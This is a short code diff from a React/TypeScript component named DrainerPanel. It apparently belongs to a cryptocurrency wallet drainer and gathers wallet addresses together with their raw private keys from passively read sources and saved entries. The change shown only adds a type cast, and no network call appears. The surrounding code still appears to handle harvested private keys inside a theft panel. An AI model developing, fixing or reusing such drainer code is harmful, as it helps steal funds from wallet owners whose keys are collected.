@@ -215,7 +215,7 @@ export default function DrainerPanel() {
     for (const p of readAllPassive())   {
       if (!map.has(p.address)) map.set(p.address, {
         address: p.address, privHex: p.privateKey.replace(/^0x/, ''),
-        network: p.network,  addrType: p.addressType || undefined,
+        network: p.network,  addrType: (p.addressType || undefined) as WalletAccount['addrType'],
       });
     }
     for (const s of w.saved) map.set(s.address, s);
